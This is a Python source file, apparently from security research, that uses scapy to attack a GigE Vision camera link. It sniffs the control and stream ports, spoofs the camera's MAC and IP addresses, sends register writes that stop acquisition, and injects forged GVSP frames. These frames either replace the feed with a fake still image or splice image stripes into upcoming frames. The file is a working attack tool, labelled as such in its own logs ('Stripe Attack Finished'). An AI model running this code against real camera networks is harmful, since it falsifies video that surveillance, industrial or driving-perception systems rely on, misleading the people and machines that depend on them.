import logging
import cv2
import matplotlib.pyplot as plt
import numpy as np
from typing import List, Optional
from scapy.packet import Packet, bind_layers
from scapy.fields import *
from scapy.layers.inet import UDP, IP, Ether
from scapy.plist import PacketList
from scapy.all import (
    sniff,
    sendp,
    sendpfast,
    rdpcap,
    Raw,
    PcapWriter,
    PacketListField,
    StrNullField,
    ConditionalField,
    Padding,
)
from scapy.all import hexdump
import time
from enum import IntEnum, Enum
import argparse
from pathlib import Path
import sys
import random

from gige.constansts import *
from gige.gige_constants import *
from gige.utils import img_to_packets_payload, bgr_img_to_packets_payload
from utils.image_processing import bgr_to_bayer_rg
from utils.injection import get_stripe, insert_stripe_to_img
from utils.detection_utils import Rectangle


class Method(Enum):
    WINDOWS_VIMBA = 1
    WINDOWS_MATLAB_REC = 2
    WINDOWS_MATLAB_PREVIEW = 3
    LINUX_ROS = 4


# PARAMETERS
method = Method.WINDOWS_VIMBA
camera_mac = "00:0f:31:03:67:c4"
cp_mac = "00:18:7d:c8:e6:31"

if method == Method.WINDOWS_VIMBA:
    interface = "Ethernet 6"
    cp_ip = "192.168.1.100"
    camera_ip = "192.168.10.150"
    img_width = 1936
    img_height = 1216
    max_payload_bytes = 8963
    sendp_ampiric_frame_time = 0.13

elif method == Method.WINDOWS_MATLAB_REC:
    interface = "Ethernet 6"
    cp_ip = "192.168.1.100"
    camera_ip = "192.168.0.1"
    img_width = 1920
    img_height = 1080
    max_payload_bytes = 8950
elif method == Method.WINDOWS_MATLAB_PREVIEW:
    interface = "Ethernet 6"
    cp_ip = "192.168.1.100"
    camera_ip = "192.168.0.1"
    img_width = 1936
    img_height = 1216
    max_payload_bytes = 8950
elif method == Method.LINUX_ROS:
    interface = "enp1s0"

default_request_id = 1
default_block_id = 1

gvcp_excluded_ports = [58732]


class GvcpCmd(Packet):
    # TODO split to sub commands according to the command value
    name = Layers.GVCP.value
    fields_desc = [
        XBitField("MessageKeyCode", 0x42, BYTE),
        XBitField("Flags", 0x01, BYTE),
        XShortEnumField(
            "Command", None, {v.value: k for k, v in GvcpCommands._member_map_.items()}
        ),
        ShortField("PayloadLength", 0x0008),
        ShortField("RequestID", 1),
        XBitField("RegisterAddress", 0x000130F4, 4 * BYTE),
        IntField("value", None),
    ]


bind_layers(UDP, GvcpCmd, dport=Ports.GVCP_DST.value)
bind_layers(UDP, GvcpCmd, sport=Ports.GVCP_DST.value)


class GvspLeader(Packet):
    name = Layers.GVSP_LEADER.value
    fields_desc = [
        ShortField("FieldInfo", 0),
        ShortField("PayloadType", 0x0001),
        XBitField("Timestamp", 1, 8 * BYTE),
        XBitField("PixelFormat", 0x01080009, 4 * BYTE),
        IntField("SizeX", img_width),
        IntField("SizeY", img_height),
        IntField("OffsetX", 0),
        IntField("OffsetY", 0),
        ShortField("PaddingX", 0),
        ShortField("PaddingY", 0),
    ]


class GvspTrailer(Packet):
    name = Layers.GVSP_TRAILER.value
    fields_desc = [
        ShortField("FieldInfo", 0),
        ShortField("PayloadType", 0x0001),
        IntField("SizeY", img_height),
    ]
    # ShortField("UnknownPadding", 0x5555)] #TODO check why originally there is padding 5555 for the UDP


class Gvsp(Packet):
    name = Layers.GVSP.value
    fields_desc = [
        XBitField("Status", 0x0000, 2 * BYTE),
        ShortField("BlockID", 0),
        XByteEnumField(
            "Format", None, {v.value: k for k, v in GvspFormat._member_map_.items()}
        ),
        XBitField("PacketID", 0x000000, 3 * BYTE),
    ]


bind_layers(UDP, Gvsp, sport=Ports.GVSP_SRC.value)
bind_layers(Gvsp, GvspLeader, Format=GvspFormat.LEADER.value)
bind_layers(Gvsp, GvspTrailer, Format=GvspFormat.TRAILER.value)


class GigELink:
    def __init__(
        self,
        interface: str,
        cp_ip: str = cp_ip,
        camera_ip: str = camera_ip,
        img_width: int = img_width,
        img_height: int = img_height,
        max_payload_bytes: int = max_payload_bytes,
        logger: Optional[logging.Logger] = None
    ):
        self.interface = interface
        self.cp_ip = cp_ip
        self.camera_ip = camera_ip
        self.img_width = img_width
        self.img_height = img_height
        self.max_payload_bytes = max_payload_bytes
        self.gvsp_dst_port = -1
        self.gvcp_src_port = -1
        self.last_block_id = default_block_id - 1
        self.logger = logger

    def set_gvsp_dst_port(self, gvsp_dst_port):
        self.gvsp_dst_port = gvsp_dst_port

    def set_gvcp_src_port(self, gvcp_src_port):
        self.gvcp_src_port = gvcp_src_port

    def log_link(self):
        msg = "GVCP:\n"
        msg += f"\tCP {self.cp_ip}({self.gvcp_src_port}) ---> Camera {self.camera_ip}({Ports.GVCP_DST.value})\n"
        msg += "GVSP:\n"
        msg += f"\tCamera {self.camera_ip}({Ports.GVSP_SRC.value}) ---> CP {self.cp_ip}({self.gvsp_dst_port})"
        self.log(msg)

    def _get_writereg_cmd(self, address: int, value: int, ack_required: bool = False):
        flags = 0x01 if ack_required else 0x00
        request_id = random.randint(a=1, b=0xFFFF)
        # request_id = default_request_id
        cmd = (
            Ether(src=cp_mac, dst=camera_mac)
            / IP(src=self.cp_ip, dst=self.camera_ip)
            / UDP(sport=self.gvcp_src_port, dport=Ports.GVCP_DST.value)
            / GvcpCmd(
                Command="WRITEREG_CMD",
                Flags=flags,
                RegisterAddress=address,
                value=value,
                RequestID=request_id,
            )
        )
        return cmd

    def _get_aquisition_cmd(self, reg_val, ack_required=False):
        return self._get_writereg_cmd(
            address=GigERegisters.ACQUISITION.value,
            value=reg_val,
            ack_required=ack_required,
        )

    def send_set_height_command(self, height: int) -> None:
        cmd = self._get_writereg_cmd(
            address=GigERegisters.HEIGHT.value, value=height, ack_required=True
        )
        sendp(cmd, iface=self.interface, count=1, verbose=False)

    def send_set_width_command(self, width: int) -> None:
        cmd = self._get_writereg_cmd(
            address=GigERegisters.WIDTH.value, value=width, ack_required=True
        )
        sendp(cmd, iface=self.interface, count=1, verbose=False)

    def send_stop_command(self, count=1, ack_required=False):
        cmd = self._get_aquisition_cmd(reg_val=0, ack_required=ack_required)
        sendp(cmd, iface=self.interface, count=count, verbose=False)

    def send_start_command(self, count=1, ack_required=False):
        cmd = self._get_aquisition_cmd(reg_val=1, ack_required=ack_required)
        sendp(cmd, iface=self.interface, count=count, verbose=False)

    def sniff_link_parameters(self):
        def pkt_callback(pkt):
            gvsp_port_found = self.gvsp_dst_port != -1
            gvcp_port_found = self.gvcp_src_port != -1

            if (
                not gvsp_port_found
                and pkt.haslayer(Layers.GVSP.value)
                and pkt[Layers.IP.value].src == self.camera_ip
            ):
                gvsp_dst_port = pkt[Layers.UDP.value].dport
                self.set_gvsp_dst_port(gvsp_dst_port)
                self.log(f"Found GVSP port {gvsp_dst_port}", log_level=logging.DEBUG)
            elif (
                not gvcp_port_found
                and pkt.haslayer(Layers.GVCP.value)
                and pkt[Layers.GVCP.value].Command == 0x0080
                and pkt[Layers.GVCP.value].RegisterAddress == GigERegisters.CCP
            ):  # TODO change command
                if pkt[Layers.UDP.value].sport not in gvcp_excluded_ports:
                    gvcp_src_port = pkt[Layers.UDP.value].sport
                    self.set_gvcp_src_port(gvcp_src_port)
                    self.log(f"Found GVCP port {gvcp_src_port}", log_level=logging.DEBUG)

        def stop_filter(pkt):
            return self.gvsp_dst_port != -1 and self.gvcp_src_port != -1

        # sniff for ports
        self.log("sniffing")
        sniff(
            iface=self.interface,
            prn=pkt_callback,
            filter="udp",
            stop_filter=stop_filter,
            store=0,
        )
        self.log_link()

    def sniffing_for_trailer_filter(self, pkt):
        if pkt.haslayer(Layers.GVSP.value):
            if pkt[Layers.GVSP.value].Format == "TRAILER":
                return True
        return False

    def callback_update_block_id(self, pkt):
        if (
            pkt.haslayer(Layers.GVSP.value)
            and pkt[Layers.IP.value].src == self.camera_ip
        ):
            self.last_block_id = pkt[Layers.GVSP.value].BlockID

    def stop_and_replace_with_pcap(self, frame_pcap_path, timeout=2):
        self.log("Stopping acquisition", log_level=logging.DEBUG)
        self.send_stop_command(count=1)
        self.log(f"Sniffing until TRAILER is sent, timeout {timeout} seconds", log_level=logging.DEBUG)
        sniff(
            iface=self.interface,
            filter="udp",
            prn=self.callback_update_block_id,
            stop_filter=self.sniffing_for_trailer_filter,
            store=0,
            timeout=timeout,
        )
        self.log("Aliasing")
        gvsp_packets = rdpcap(frame_pcap_path)
        for packet in gvsp_packets:
            packet[Layers.UDP.value].dport = self.gvsp_dst_port
            packet["IP"].src = self.camera_ip
            packet["IP"].dst = self.cp_ip
        sendp(gvsp_packets, iface=self.interface, verbose=False)
        self.last_block_id = gvsp_packets[0][Layers.GVSP.value].BlockID

    def stop_and_replace_with_image(self, img_path, timeout=2):
        self.log("Stopping acquisition")
        self.send_stop_command(count=1)
        self.log(f"Sniffing until TRAILER is sent, timeout {timeout} seconds")
        sniff(
            iface=self.interface,
            filter="udp",
            prn=self.callback_update_block_id,
            stop_filter=self.sniffing_for_trailer_filter,
            store=0,
            timeout=timeout,
        )
        self.log("Aliasing")
        gvsp_packets = self.img_to_gvsp(img_path, block_id=self.last_block_id + 1)
        sendp(gvsp_packets, iface=self.interface, verbose=False)
        self.last_block_id = gvsp_packets[0][Layers.GVSP.value].BlockID

    def img_to_gvsp_using_ref(
        self, img_path: str, reference_gvsp_pacp: str
    ) -> PacketList:
        payload = self.get_gvsp_payload_packets(img_path)
        gvsp_packets = self.insert_payload_to_gvsp_pcap(payload, reference_gvsp_pacp)
        return gvsp_packets

    def insert_payload_to_gvsp_pcap(
        self,
        payload: List[bytes],
        reference_gvsp_pacp: str,
        block_id: int = default_block_id,
    ) -> PacketList:
        gvsp_packets = rdpcap(reference_gvsp_pacp)
        for pkt, pkt_payload in zip(gvsp_packets[1:-1], payload):
            pkt[Layers.GVSP.value].load = pkt_payload
        for pkt in gvsp_packets:
            pkt[Layers.UDP.value].src = Ports.GVSP_SRC.value
            pkt[Layers.UDP.value].dst = self.gvsp_dst_port
            pkt[Layers.IP.value].src = self.camera_ip
            pkt[Layers.IP.value].dst = self.cp_ip
            pkt[Layers.GVSP.value].BlockID = block_id
        return gvsp_packets

    def get_gvsp_payload_packets(self, img_path: str) -> PacketList:
        img_bgr = cv2.imread(img_path)  # BGR
        img_bgr = cv2.resize(img_bgr, (self.img_width, self.img_height))
        payload = bgr_img_to_packets_payload(img_bgr, self.max_payload_bytes)
        return payload

    def img_to_gvsp(
        self, img_path: str, save_pcap_debug=True, block_id: int = default_block_id
    ) -> PacketList:
        gvsp_packets = []

        packet_id = 0
        leader_packet = (
            Ether(dst=cp_mac, src=camera_mac)
            / IP(src=self.camera_ip, dst=self.cp_ip)
            / UDP(sport=Ports.GVSP_SRC.value, dport=self.gvsp_dst_port, chksum=0)
            / Gvsp(BlockID=block_id, Format="LEADER", PacketID=packet_id)
            / GvspLeader(SizeX=self.img_width, SizeY=self.img_height)
        )
        gvsp_packets.append(leader_packet)
        packet_id += 1

        payload = self.get_gvsp_payload_packets(img_path=img_path)
        for pkt_payload in payload:
            next_pkt = (
                Ether(dst=cp_mac, src=camera_mac)
                / IP(src=self.camera_ip, dst=self.cp_ip)
                / UDP(sport=Ports.GVSP_SRC.value, dport=self.gvsp_dst_port, chksum=0)
                / Gvsp(BlockID=block_id, Format="PAYLOAD", PacketID=packet_id)
                / Raw(bytes(pkt_payload))
            )
            gvsp_packets.append(next_pkt)
            packet_id += 1

        trailer_packet = (
            Ether(dst=cp_mac, src=camera_mac)
            / IP(src=self.camera_ip, dst=self.cp_ip)
            / UDP(sport=Ports.GVSP_SRC.value, dport=self.gvsp_dst_port, chksum=0)
            / Gvsp(BlockID=block_id, Format="TRAILER", PacketID=packet_id)
            / GvspTrailer(SizeY=self.img_height)
        )
        gvsp_packets.append(trailer_packet)
        packet_id += 1

        gvsp_packets = PacketList(gvsp_packets)

        if save_pcap_debug:
            pktdump = PcapWriter(
                "debugging_cfrafted_gvsp.pcap", append=False, sync=True
            )
            for pkt in gvsp_packets:
                pktdump.write(pkt)
            pktdump.close()

        return gvsp_packets

    def sniff_block_id(self) -> None:
        self.log("Sniffing for blockID", log_level=logging.DEBUG)
        sniff(
            iface=self.interface,
            filter="udp",
            prn=self.callback_update_block_id,
            stop_filter=self.sniffing_for_trailer_filter,
            store=0,
            timeout=1,
        )
        self.log(f"Last Sniffed BLockID = {self.last_block_id}", log_level=logging.DEBUG)

    def inject_gvsp_packets(
        self, gvsp_packets: PacketList, block_id: int, count: int = 100
    ) -> None:
        for pkt in gvsp_packets:
            pkt[Layers.GVSP.value].BlockID = block_id
        sendp(
            gvsp_packets,
            iface=self.interface,
            verbose=False,
            realtime=True,
            count=count,
        )

    def get_stripe_gvsp_packets(
        self,
        img_path: str,
        first_row: int,
        num_rows: int,
        block_id: int,
        target_row: int = 0,
    ) -> PacketList:
        img_bgr = cv2.imread(img_path)  # BGR
        img_bgr = cv2.resize(img_bgr, (self.img_width, self.img_height))

        stripe = get_stripe(
            img_bgr, Rectangle((0, first_row), (self.img_width, first_row + num_rows))
        )
        background_img = np.zeros_like(img_bgr)
        injection_img = insert_stripe_to_img(background_img, stripe, target_row)

        payload = bgr_img_to_packets_payload(injection_img, self.max_payload_bytes)
        stripe_packets = []
        for pkt_id, pkt_payload in enumerate(payload):
            if (pkt_payload != 0).any():
                next_pkt = (
                    Ether(dst=cp_mac, src=camera_mac)
                    / IP(src=self.camera_ip, dst=self.cp_ip)
                    / UDP(
                        sport=Ports.GVSP_SRC.value, dport=self.gvsp_dst_port, chksum=0
                    )
                    / Gvsp(BlockID=block_id, Format="PAYLOAD", PacketID=pkt_id + 1)
                    / Raw(bytes(pkt_payload))
                )
                stripe_packets.append(next_pkt)
        return stripe_packets

    def inject_stripe(
        self,
        img_path: str,
        first_row: int,
        num_rows: int,
        future_id_diff: int = 10,
        count: int = 100,
    ) -> int:
        stripe_packets = self.get_stripe_gvsp_packets(
            img_path, first_row, num_rows, block_id=0
        )
        self.sniff_block_id()
        injected_id = self.last_block_id + future_id_diff
        self.inject_gvsp_packets(stripe_packets, block_id=injected_id, count=count)
        return injected_id

    def inject_stripe_consecutive_frames(
        self,
        img_path: str,
        first_row: int,
        num_rows: int,
        fps: float,
        injection_duration: float,
        future_id_diff: int = 10,
        count: int = 100,
    ):
        stripe_packets = self.get_stripe_gvsp_packets(
            img_path, first_row, num_rows, block_id=0
        )
        num_injections = int(np.ceil(fps * injection_duration))
        frame_duration = 1 / fps
        self.sniff_block_id()
        first_injected_id = self.last_block_id + future_id_diff
        self.log(
            f"Attempting stripe injection for frames {first_injected_id} - {first_injected_id + num_injections - 1}",
              log_level=logging.DEBUG)
        for injection_ind in range(num_injections):
            start_time = time.time()
            self.log(f"Injecting stripe to {first_injected_id + injection_ind}", log_level=logging.DEBUG)
            self.inject_gvsp_packets(
                stripe_packets, block_id=first_injected_id + injection_ind, count=count
            )
            end_time = time.time()
            self.log(f"Insertion took {end_time - start_time} seconds", log_level=logging.DEBUG)
            time.sleep(max(0, frame_duration - (end_time - start_time)))
        self.log(
            f"Stripe Attack Finished"
        )

    def fake_still_image(
        self,
        img_path,
        duration,
        injection_effective_frame_rate,
        fps: Optional[float] = None,
    ):
        # TODO: read register to get fps
        timeout = 1  # seconds
        self.sniff_block_id()
        self.log("BlockID found", log_level=logging.DEBUG)
        self.log(f"Stopping acquisition for {duration} seconds with still image", log_level=logging.DEBUG)
        self.send_stop_command(count=1)
        self.log(f"Sniffing until TRAILER is sent, timeout {timeout} seconds", log_level=logging.DEBUG)
        sniff(
            iface=self.interface,
            filter="udp",
            prn=self.callback_update_block_id,
            stop_filter=self.sniffing_for_trailer_filter,
            store=0,
            timeout=timeout,
        )
        self.log("Faking")
        num_frames = round(duration * min(injection_effective_frame_rate, fps))
        self.log(f"Number of fake frames = {num_frames}", log_level=logging.DEBUG)
        self.log(f"Last GVSP BlockID = {self.last_block_id}", log_level=logging.DEBUG)
        gvsp_fake_packets = self.img_to_gvsp(img_path, block_id=default_block_id)
        aliasing_started = time.time()
        iterations_time = []
        for _ in range(num_frames):
            for pkt in gvsp_fake_packets:
                pkt[Layers.GVSP.value].BlockID = self.last_block_id + 1
            itertation_started = time.time()
            sendp(gvsp_fake_packets, iface=self.interface, verbose=False)
            iteration_ended = time.time()
            iteration_duration = iteration_ended - itertation_started
            iterations_time.append(iteration_duration)
            time.sleep(max(0, 1 / fps - iteration_duration))
            self.last_block_id = self.last_block_id + 1

        aliasing_finished = time.time()
        self.log(f"Faking for {aliasing_finished-aliasing_started} seconds")

        self.log("Starting acquisition", log_level=logging.DEBUG)
        self.send_start_command(count=1)

        self.log(f"average iteration time = {np.average(np.array(iterations_time))}", log_level=logging.DEBUG)

    def log(self, msg, log_level=logging.INFO):
        if self.logger is None:
            print(msg)
            return
        if log_level == logging.DEBUG:
            self.logger.debug(msg)
        elif log_level == logging.INFO:
            self.logger.info(msg)
        elif log_level == logging.WARNING:
            self.logger.warning(msg)
        elif log_level == logging.ERROR:
            self.logger.error(msg)
        elif log_level == logging.CRITICAL:
            self.logger.critical(msg)
        else:
            raise ValueError(f"Invalid log level: {log_level}")

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--path", required=True, help="path to fake image")
    parser.add_argument(
        "-d", "--duration", type=float, default=5, help="duration of faking"
    )
    parser.add_argument(
        "-r",
        "--frame_rate",
        type=float,
        default=1 / sendp_ampiric_frame_time,
        help="stream frame rate",
    )

    args = parser.parse_args()
    path = Path(args.path)
    if not path.exists():
        parser.exit(1, message="The input image doesn't exist")
    args.path = str(path.resolve())
    return args


def main():
    args = parse_args()
    link = GigELink(interface)
    link.sniff_link_parameters()
    link.fake_still_image(
        args.path,
        duration=args.duration,
        injection_effective_frame_rate=args.frame_rate,
    )


if __name__ == "__main__":
    main()
